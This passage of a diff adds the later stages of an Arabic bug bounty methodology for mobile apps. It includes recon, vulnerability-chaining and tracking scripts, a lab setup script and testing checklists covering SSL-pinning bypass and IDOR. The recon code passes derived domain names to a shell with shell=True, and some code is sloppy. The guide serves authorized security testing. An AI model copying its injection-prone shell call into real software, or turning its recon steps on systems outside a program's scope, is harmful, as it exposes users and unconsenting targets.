+        self.results['last_updated'] = soup.find('div', {'class': 'hAyfc'}).text
+    
+    def find_related_domains(self):
+        """البحث عن النطاقات المرتبطة"""
+        # استخراج النطاق من اسم الحزمة
+        parts = self.package_name.split('.')
+        possible_domains = [
+            f"{parts[1]}.{parts[0]}",
+            f"{parts[0]}.{parts[1]}",
+            f"{'.'.join(parts[::-1])}"
+        ]
+        
+        self.results['domains'] = []
+        for domain in possible_domains:
+            try:
+                response = requests.get(f"http://{domain}", timeout=5)
+                if response.status_code == 200:
+                    self.results['domains'].append(domain)
+            except:
+                pass
+    
+    def find_subdomains(self):
+        """البحث عن Subdomains"""
+        for domain in self.results.get('domains', []):
+            cmd = f"subfinder -d {domain} -silent"
+            output = subprocess.check_output(cmd, shell=True).decode()
+            self.results['subdomains'] = output.splitlines()
+    
+    def generate_report(self):
+        """إنشاء تقرير شامل"""
+        with open('recon_report.json', 'w') as f:
+            json.dump(self.results, f, indent=4)
+```
+
+### 2. Vulnerability Chain Builder
+```python
+class VulnerabilityChainBuilder:
+    def __init__(self):
+        self.vulnerabilities = []
+        self.chains = []
+    
+    def add_vulnerability(self, vuln):
+        """إضافة ثغرة للقائمة"""
+        self.vulnerabilities.append(vuln)
+    
+    def build_chains(self):
+        """بناء سلاسل الثغرات"""
+        # مثال: IDOR + Information Disclosure = Account Takeover
+        for i, vuln1 in enumerate(self.vulnerabilities):
+            for vuln2 in self.vulnerabilities[i+1:]:
+                if self.can_chain(vuln1, vuln2):
+                    chain = {
+                        'vulnerabilities': [vuln1, vuln2],
+                        'impact': self.calculate_impact(vuln1, vuln2),
+                        'description': self.generate_chain_description(vuln1, vuln2)
+                    }
+                    self.chains.append(chain)
+    
+    def can_chain(self, vuln1, vuln2):
+        """التحقق من إمكانية ربط الثغرات"""
+        chainable_pairs = {
+            ('IDOR', 'Information Disclosure'): True,
+            ('XSS', 'CSRF'): True,
+            ('SQL Injection', 'Authentication Bypass'): True,
+            ('File Upload', 'Remote Code Execution'): True
+        }
+        return chainable_pairs.get((vuln1['type'], vuln2['type']), False)
+```
+
+</details>
+
+## 📊 المرحلة 8: Metrics & Tracking
+
+<details>
+<summary>📈 8.1 تتبع الأداء في Bug Bounty</summary>
+
+```python
+import sqlite3
+import datetime
+import matplotlib.pyplot as plt
+
+class BugBountyTracker:
+    def __init__(self):
+        self.conn = sqlite3.connect('bugbounty.db')
+        self.create_tables()
+    
+    def create_tables(self):
+        """إنشاء جداول قاعدة البيانات"""
+        self.conn.execute('''
+            CREATE TABLE IF NOT EXISTS submissions (
+                id INTEGER PRIMARY KEY,
+                platform TEXT,
+                program TEXT,
+                vulnerability_type TEXT,
+                severity TEXT,
+                status TEXT,
+                bounty_amount REAL,
+                submission_date DATE,
+                resolution_date DATE
+            )
+        ''')
+    
+    def add_submission(self, data):
+        """إضافة تقرير جديد"""
+        self.conn.execute('''
+            INSERT INTO submissions 
+            (platform, program, vulnerability_type, severity, status, bounty_amount, submission_date)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        ''', (data['platform'], data['program'], data['vulnerability_type'], 
+              data['severity'], data['status'], data['bounty_amount'], 
+              datetime.date.today()))
+        self.conn.commit()
+    
+    def generate_statistics(self):
+        """إنشاء إحصائيات"""
+        stats = {}
+        
+        # إجمالي المكافآت
+        cursor = self.conn.execute('SELECT SUM(bounty_amount) FROM submissions WHERE status="Paid"')
+        stats['total_earnings'] = cursor.fetchone()[0]
+        
+        # عدد التقارير حسب الحالة
+        cursor = self.conn.execute('SELECT status, COUNT(*) FROM submissions GROUP BY status')
+        stats['submissions_by_status'] = dict(cursor.fetchall())
+        
+        # أكثر أنواع الثغرات نجاحًا
+        cursor = self.conn.execute('''
+            SELECT vulnerability_type, COUNT(*) as count 
+            FROM submissions 
+            WHERE status="Paid" 
+            GROUP BY vulnerability_type 
+            ORDER BY count DESC 
+            LIMIT 5
+        ''')
+        stats['top_vulnerabilities'] = cursor.fetchall()
+        
+        return stats
+    
+    def plot_earnings_over_time(self):
+        """رسم بياني للأرباح عبر الزمن"""
+        cursor = self.conn.execute('''
+            SELECT submission_date, SUM(bounty_amount) 
+            FROM submissions 
+            WHERE status="Paid" 
+            GROUP BY submission_date 
+            ORDER BY submission_date
+        ''')
+        
+        dates = []
+        amounts = []
+        for row in cursor.fetchall():
+            dates.append(row[0])
+            amounts.append(row[1])
+        
+        plt.figure(figsize=(10, 6))
+        plt.plot(dates, amounts, marker='o')
+        plt.title('Bug Bounty Earnings Over Time')
+        plt.xlabel('Date')
+        plt.ylabel('Amount ($)')
+        plt.xticks(rotation=45)
+        plt.tight_layout()
+        plt.savefig('earnings_chart.png')
+```
+
+</details>
+
+## 🚀 المرحلة 9: Continuous Learning & Improvement
+
+<details>
+<summary>📚 9.1 متابعة أحدث الثغرات</summary>
+
+```python
+#!/usr/bin/env python3
+import feedparser
+import requests
+from datetime import datetime
+
+class SecurityNewsAggregator:
+    def __init__(self):
+        self.feeds = [
+            'https://hackerone.com/hacktivity.rss',
+            'https://portswigger.net/daily-swig/rss',
+            'https://www.reddit.com/r/netsec/.rss',
+            'https://blog.oversecured.com/rss.xml'
+        ]
+        self.keywords = ['android', 'ios', 'mobile', 'app']
+    
+    def fetch_latest_news(self):
+        """جلب آخر الأخبار الأمنية"""
+        all_news = []
+        
+        for feed_url in self.feeds:
+            feed = feedparser.parse(feed_url)
+            for entry in feed.entries:
+                if any(keyword in entry.title.lower() for keyword in self.keywords):
+                    all_news.append({
+                        'title': entry.title,
+                        'link': entry.link,
+                        'published': entry.published,
+                        'source': feed.feed.title
+                    })
+        
+        return sorted(all_news, key=lambda x: x['published'], reverse=True)
+    
+    def monitor_new_disclosures(self):
+        """مراقبة الثغرات الجديدة المنشورة"""
+        h1_url = "https://api.hackerone.com/v1/hacktivity"
+        # يتطلب API key
+        response = requests.get(h1_url)
+        disclosures = response.json()
+        
+        mobile_disclosures = []
+        for disclosure in disclosures:
+            if any(keyword in disclosure['title'].lower() for keyword in self.keywords):
+                mobile_disclosures.append(disclosure)
+        
+        return mobile_disclosures
+```
+
+</details>
+
+<details>
+<summary>🔬 9.2 بناء معمل اختبار شخصي</summary>
+
+```bash
+#!/bin/bash
+# Mobile Security Lab Setup Script
+
+echo "[+] Setting up Mobile Security Lab..."
+
+# تثبيت الأدوات الأساسية
+apt-get update
+apt-get install -y python3 python3-pip git openjdk-11-jdk
+
+# تثبيت أدوات Android
+wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
+unzip platform-tools-latest-linux.zip
+mv platform-tools /opt/
+echo 'export PATH=$PATH:/opt/platform-tools' >> ~/.bashrc
+
+# تثبيت أدوات التحليل
+pip3 install frida-tools objection androguard mobsf
+
+# تحميل أدوات إضافية
+git clone https://github.com/skylot/jadx.git
+git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
+git clone https://github.com/sensepost/objection.git
+
+# إعداد Burp Suite
+wget https://portswigger.net/burp/releases/download -O burpsuite.jar
+
+echo "[+] Lab setup complete!"
+```
+
+</details>
+
+## 📋 المرحلة 10: Checklist النهائية للـ Bug Bounty
+
+<details>
+<summary>✅ قائمة فحص شاملة</summary>
+
+### Pre-Testing Checklist
+- [ ] قراءة سياسة البرنامج بعناية
+- [ ] فهم النطاق (In-Scope/Out-of-Scope)
+- [ ] إعداد بيئة الاختبار
+- [ ] تثبيت جميع الأدوات المطلوبة
+- [ ] إعداد VPN (إذا لزم الأمر)
+
+### Static Analysis Checklist
+- [ ] فك تشفير التطبيق
+- [ ] البحث عن hardcoded secrets
+- [ ] تحليل AndroidManifest.xml
+- [ ] فحص المكونات المصدرة
+- [ ] تحليل مكتبات الطرف الثالث
+- [ ] فحص التشفير المستخدم
+
+### Dynamic Analysis Checklist
+- [ ] إعداد الـ Proxy
+- [ ] تجاوز SSL Pinning
+- [ ] مراقبة حركة الشبكة
+- [ ] اختبار جميع API endpoints
+- [ ] اختبار المصادقة والتفويض
+- [ ] فحص التخزين المحلي
+
+### Vulnerability Testing Checklist
+- [ ] IDOR Testing
+- [ ] Broken Access Control
+- [ ] Information Disclosure
+- [ ] SQL Injection
+- [ ] XSS in WebViews
+- [ ] Deep Link Vulnerabilities
+- [ ] Path Traversal
+- [ ] Business Logic Flaws
+
+### Reporting Checklist
+- [ ] كتابة عنوان واضح ومحدد
+- [ ] شرح التأثير الأمني
+- [ ] توفير خطوات إعادة الإنتاج
+- [ ] إضافة لقطات شاشة/فيديو
+- [ ] اقتراح حلول للإصلاح
+- [ ] مراجعة التقرير قبل الإرسال
+
+</details>
+
+## 🎯 الخلاصة
+
+> ### 💡 ما توفره هذه المنهجية:
+> - إطار عمل متكامل لـ Bug Bounty على HackerOne
+> - تغطية لجميع أنواع الثغرات في تطبيقات الموبايل
+> - أدوات وسكريبتات جاهزة للاستخدام
+> - استراتيجيات متقدمة لاكتشاف الثغرات
+> - نظام متابعة وتحسين مستمر
+
+> ### 🔑 تذكر دائمًا:
+> 1. اتبع القواعد الأخلاقية
+> 2. احترم نطاق البرنامج
+> 3. وثق كل شيء
+> 4. كن صبورًا ومثابرًا
+> 5. تعلم من كل تقرير
+ 
